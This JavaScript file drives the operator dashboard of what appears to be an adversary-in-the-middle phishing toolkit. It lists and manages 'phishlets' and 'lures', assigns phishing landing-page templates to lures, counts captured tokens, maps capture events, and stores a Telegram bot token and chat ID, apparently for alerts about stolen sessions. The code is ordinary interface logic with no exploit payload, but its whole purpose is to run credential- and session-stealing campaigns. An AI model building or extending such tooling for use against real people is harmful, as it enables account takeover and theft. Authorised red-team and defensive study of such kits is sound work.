const AppState = {
    currentTab: 'dashboard',
    map: null,
    mapInitialized: false,
    selectedCategory: 'all',
    landingSearch: '',
    landingTemplates: [],
    activeLures: [],
    selectedLureIndex: null
};

const Theme = {
    init() {
        const theme = localStorage.getItem('theme') || 'dark';
        document.body.classList.toggle('theme-light', theme === 'light');
        const iconEl = document.getElementById('themeToggle')?.querySelector('i');
        if (iconEl) iconEl.className = theme === 'light' ? 'ri-moon-line' : 'ri-sun-line';
    }
};

function normalizeTabId(name) {
    return name.replace(/-([a-z])/g, (_, letter) => letter.toUpperCase()) + 'Tab';
}

function switchTab(tabName) {
    AppState.currentTab = tabName;
    document.querySelectorAll('.sidebar-nav-item').forEach(btn => btn.classList.toggle('active', btn.dataset.tab === tabName));

    const selectedId = normalizeTabId(tabName);
    document.querySelectorAll('.tab-content').forEach(tab => tab.classList.toggle('active', tab.id === selectedId));

    if (tabName === 'map') {
        requestAnimationFrame(() => {
            if (!AppState.mapInitialized) initMap();
            else AppState.map.invalidateSize();
        });
    }

    if (tabName === 'landing-pages') {
        loadLandingTemplates();
        loadActiveLures();
    }
}

function initializeSidebarToggle() {
    const button = document.getElementById('sidebarToggle');
    if (button) button.addEventListener('click', () => document.querySelector('.app-shell').classList.toggle('collapsed'));
}

function initializeButtons() {
    const refreshButton = document.getElementById('refreshBtn');
    if (refreshButton) refreshButton.addEventListener('click', () => location.reload());

    const logoutButton = document.getElementById('logoutBtn');
    if (logoutButton) logoutButton.addEventListener('click', () => location.href = '/logout');

    const themeButton = document.getElementById('themeToggle');
    if (themeButton) themeButton.addEventListener('click', () => {
        const body = document.body;
        const isLight = body.classList.toggle('theme-light');
        localStorage.setItem('theme', isLight ? 'light' : 'dark');
        themeButton.querySelector('i').className = isLight ? 'ri-moon-line' : 'ri-sun-line';
    });

    const refreshLandingButton = document.getElementById('refreshLandingPagesBtn');
    if (refreshLandingButton) refreshLandingButton.addEventListener('click', () => {
        loadLandingTemplates();
        loadActiveLures();
    });

    const searchInput = document.getElementById('landingSearch');
    if (searchInput) searchInput.addEventListener('input', event => {
        AppState.landingSearch = event.target.value;
        renderLandingPages();
    });

    document.querySelectorAll('.category-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.category-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            AppState.selectedCategory = btn.dataset.category || 'all';
            renderLandingPages();
        });
    });
}

function initializeSidebarNav() {
    document.querySelectorAll('.sidebar-nav-item').forEach(btn => btn.addEventListener('click', () => switchTab(btn.dataset.tab)));
}

function initDashboard() {
    const metrics = {
        totalSessions: '0',
        uniqueCountries: '0',
        totalTokens: '0',
        activePhishlets: '0'
    };

    Object.entries(metrics).forEach(([id, value]) => {
        const el = document.getElementById(id);
        if (el) el.textContent = value;
    });
}

function initMap() {
    const mapElement = document.getElementById('map');
    if (!mapElement) return;

    AppState.map = L.map('map', {
        center: [20, 0],
        zoom: 2,
        minZoom: 2,
        scrollWheelZoom: false
    });

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors',
        maxZoom: 18
    }).addTo(AppState.map);

    L.circle([37.7749, -122.4194], { radius: 350000, color: '#7c3aed', fillColor: '#7c3aed', fillOpacity: 0.18 }).addTo(AppState.map).bindPopup('San Francisco: Active session cluster');
    L.circle([51.5074, -0.1278], { radius: 360000, color: '#22c55e', fillColor: '#22c55e', fillOpacity: 0.18 }).addTo(AppState.map).bindPopup('London: Suspicious token capture');
    L.circle([25.2048, 55.2708], { radius: 310000, color: '#facc15', fillColor: '#facc15', fillOpacity: 0.18 }).addTo(AppState.map).bindPopup('Dubai: Recent login event');

    AppState.mapInitialized = true;
    AppState.map.invalidateSize();
}

function fetchJson(url) {
    return fetch(url, { credentials: 'same-origin' }).then(response => {
        if (!response.ok) throw new Error(response.statusText);
        return response.json();
    });
}

function loadLandingTemplates() {
    fetchJson('/api/landing-pages')
        .then(templates => {
            AppState.landingTemplates = templates || [];
            renderLandingPages();
        })
        .catch(() => {
            AppState.landingTemplates = [];
            renderLandingPages();
        });
}

function loadActiveLures() {
    fetchJson('/api/lures')
        .then(lures => {
            AppState.activeLures = lures || [];
            renderActiveLures();
        })
        .catch(() => {
            AppState.activeLures = [];
            renderActiveLures();
        });
}

function updateSelectedLureLabel() {
    const label = document.getElementById('selectedLureLabel');
    if (!label) return;
    const lure = AppState.activeLures.find(l => l.index === AppState.selectedLureIndex);
    label.textContent = lure ? `${lure.phishlet} @ ${lure.hostname}${lure.path}` : 'None';
}

function renderActiveLures() {
    const grid = document.getElementById('activeLuresGrid');
    if (!grid) return;

    grid.innerHTML = '';
    if (!AppState.activeLures.length) {
        const empty = document.createElement('div');
        empty.className = 'landing-page-card';
        empty.innerHTML = '<div class="landing-page-card-header"><div class="landing-page-card-title"><i class="ri-information-line"></i>No active lures</div></div><p class="form-hint">Create a lure in the terminal and refresh this page to manage landing page assignments.</p>';
        grid.appendChild(empty);
        return;
    }

    AppState.activeLures.forEach(lure => {
        const card = document.createElement('div');
        card.className = 'landing-page-card';
        if (lure.index === AppState.selectedLureIndex) card.classList.add('active');
        card.innerHTML = `
            <div class="landing-page-card-header">
                <div class="landing-page-card-title"><i class="ri-anchor-line"></i>Lure #${lure.index}</div>
                <span class="tag-pill">${lure.phishlet}</span>
            </div>
            <p class="landing-page-card-description">${lure.hostname || 'unknown host'}${lure.path || ''}</p>
            <div class="landing-page-card-footer">
                <span class="form-hint">${lure.landing_page ? 'Assigned: ' + lure.landing_page : 'No landing page assigned'}</span>
                <button class="btn btn-secondary btn-sm" type="button">Select</button>
            </div>
        `;
        card.querySelector('button')?.addEventListener('click', () => {
            AppState.selectedLureIndex = lure.index;
            renderActiveLures();
            updateSelectedLureLabel();
        });
        grid.appendChild(card);
    });
    updateSelectedLureLabel();
}

function createLandingCard(template) {
    const card = document.createElement('div');
    card.className = 'landing-page-card';
    const previewImg = template.preview ? `<img class="landing-page-thumbnail" src="${template.preview.startsWith('http') ? template.preview : '/' + template.preview}" alt="Preview">` : '';
    const assigned = AppState.activeLures.some(lure => lure.landing_page === `${template.category}/${template.id}`);
    card.innerHTML = `
        <div class="landing-page-card-header">
            <div class="landing-page-card-title"><i class="ri-file-list-3-line"></i>${template.name || template.id}</div>
            <span class="tag-pill">${template.category}</span>
        </div>
        ${previewImg}
        <p class="landing-page-card-description">${template.description || 'No description provided.'}</p>
        <div class="landing-page-card-footer">
            <span class="form-hint">${template.version ? 'v' + template.version : 'Template'}${assigned ? ' • Assigned' : ''}</span>
            <div class="landing-card-actions">
                <button class="btn btn-secondary btn-sm" type="button" data-action="preview">Preview</button>
                <button class="btn btn-primary btn-sm" type="button" data-action="assign" ${AppState.selectedLureIndex === null ? 'disabled' : ''}>${assigned ? 'Reassign' : 'Assign'}</button>
            </div>
        </div>
    `;

    card.querySelector('[data-action="preview"]')?.addEventListener('click', () => previewLandingPage(`${template.category}/${template.id}`));
    card.querySelector('[data-action="assign"]')?.addEventListener('click', () => assignLandingPageToSelectedLure(`${template.category}/${template.id}`));
    return card;
}

function renderLandingPages() {
    const grid = document.getElementById('landingPagesGrid');
    if (!grid) return;

    const query = AppState.landingSearch.toLowerCase();
    const filtered = AppState.landingTemplates.filter(template => {
        const matchesCategory = AppState.selectedCategory === 'all' || template.category === AppState.selectedCategory;
        const matchesSearch = template.name.toLowerCase().includes(query) || template.description.toLowerCase().includes(query) || template.id.toLowerCase().includes(query);
        return matchesCategory && matchesSearch;
    });

    grid.innerHTML = '';
    if (!filtered.length) {
        const empty = document.createElement('div');
        empty.className = 'landing-page-card';
        empty.innerHTML = '<div class="landing-page-card-header"><div class="landing-page-card-title"><i class="ri-information-line"></i>No templates found</div></div><p class="form-hint">Try a different search term or category selection.</p>';
        grid.appendChild(empty);
        return;
    }

    filtered.forEach(template => grid.appendChild(createLandingCard(template)));
}

function previewLandingPage(templateId) {
    if (!templateId) return;
    window.open(`/api/landing-pages/preview?id=${encodeURIComponent(templateId)}`, '_blank');
}

function assignLandingPageToSelectedLure(templateId) {
    if (AppState.selectedLureIndex === null) {
        alert('Select a lure before assigning a landing page.');
        return;
    }

    fetch('/api/lures/landing-page', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ lure_index: AppState.selectedLureIndex, template_id: templateId })
    })
        .then(response => response.json())
        .then(result => {
            if (result.error) throw new Error(result.error);
            loadActiveLures();
            alert('Landing page assigned successfully.');
        })
        .catch(err => {
            console.error(err);
            alert('Failed to assign landing page.');
        });
}

function loadTelegramSettings() {
    fetchJson('/get-telegram')
        .then(settings => {
            const tokenEl = document.getElementById('telegramToken');
            const chatEl = document.getElementById('telegramChatId');
            const enabledEl = document.getElementById('telegramEnabled');
            if (tokenEl) tokenEl.value = settings.botToken || '';
            if (chatEl) chatEl.value = settings.chatId || '';
            if (enabledEl) enabledEl.checked = settings.enabled === true || settings.enabled === 'true';
        });
}

function saveTelegramSettings() {
    const botToken = document.getElementById('telegramToken').value.trim();
    const chatId = document.getElementById('telegramChatId').value.trim();
    const enabled = document.getElementById('telegramEnabled').checked;

    if (!botToken || !chatId) {
        alert('Both Chat ID and Bot Token are required.');
        return;
    }

    fetch('/settings/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chatId: chatId, botToken: botToken, enabled: enabled })
    })
        .then(response => response.json())
        .then(result => {
            if (result.error) throw new Error(result.error);
            alert(result.message || 'Telegram settings saved.');
        })
        .catch(err => {
            console.error(err);
            alert('Failed to save Telegram settings.');
        });
}

window.addEventListener('DOMContentLoaded', () => {
    Theme.init();
    initializeSidebarToggle();
    initializeButtons();
    initializeSidebarNav();
    initDashboard();
    loadLandingTemplates();
    loadActiveLures();
    loadTelegramSettings();
    if (AppState.currentTab === 'map') initMap();
});
